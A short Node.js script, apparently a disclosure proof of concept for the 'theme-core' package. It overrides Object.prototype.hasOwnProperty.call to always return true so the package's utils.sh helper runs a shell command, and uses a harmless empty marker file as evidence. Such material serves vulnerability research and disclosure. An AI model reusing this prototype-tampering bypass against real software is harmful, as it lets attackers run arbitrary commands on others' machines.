Object.prototype.hasOwnProperty.call = () => true;
const a = require('theme-core');
const fs = require('fs');
const path = './theme-core';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a.utils.sh('fsutil file createnew theme-core 0', true, function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});